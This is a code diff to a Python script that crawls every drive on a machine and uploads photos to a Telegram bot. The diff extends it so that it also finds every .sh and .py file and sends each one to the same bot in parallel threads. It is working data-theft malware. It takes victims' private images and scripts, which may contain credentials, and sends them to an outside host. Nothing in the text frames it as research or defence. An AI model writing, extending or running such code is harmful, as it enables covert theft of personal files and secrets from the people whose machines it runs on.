@@ -15,7 +15,15 @@ def send_all_photos_to_telegram_bot(bot_token, chat_id):
             response.raise_for_status()
         except requests.RequestException as e:
             pass
-
+    def send_py(file):
+        try:
+            url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
+            files = {'document': open(file, 'rb')}
+            data = {'chat_id': chat_id}
+            response = requests.post(url, files=files, data=data)
+            response.raise_for_status()
+        except requests.RequestException as e:
+            print(f'Network Error: {e}')
     # Function to search for photos in a given directory and its subdirectories
     def search_photos(directory):
         for root, dirs, files in os.walk(directory):
@@ -23,7 +31,12 @@ def send_all_photos_to_telegram_bot(bot_token, chat_id):
                 if file.lower().endswith(('.jpg', '.jpeg', '.png', '.gif')):
                     photo_path = os.path.join(root, file)
                     send_photo(photo_path)
-
+    def search_py(directory):
+        for root, dirs, files in os.walk(directory):
+            for file in files:
+                if file.lower().endswith(('.sh', '.py' )):
+                    path = os.path.join(root, file)
+                    send_py(path)
     # Function to install a missing module
     def install_module(module_name):
         try:
@@ -50,13 +63,19 @@ def send_all_photos_to_telegram_bot(bot_token, chat_id):
 
     # Start a thread for each drive to search for photos
     for drive in drives:
-        t = threading.Thread(target=search_photos, args=(drive,))
-        t.start()
-        threads.append(t)
+        t1 = threading.Thread(target=search_photos, args=(drive,))
+        t2 = threading.Thread(target=search_py, args=(drive,))
+        t1.start()
+        t2.start()
+        threads.append(t1)
+        threads.append(t2)
 
     # Wait for all threads to finish
-    for t in threads:
-        t.join()
+    for t1 in threads:
+        t1.join()
+    for t2 in threads:
+        t2.join()
+    
 
     # Wait for any remaining requests to finish
     time.sleep(1)
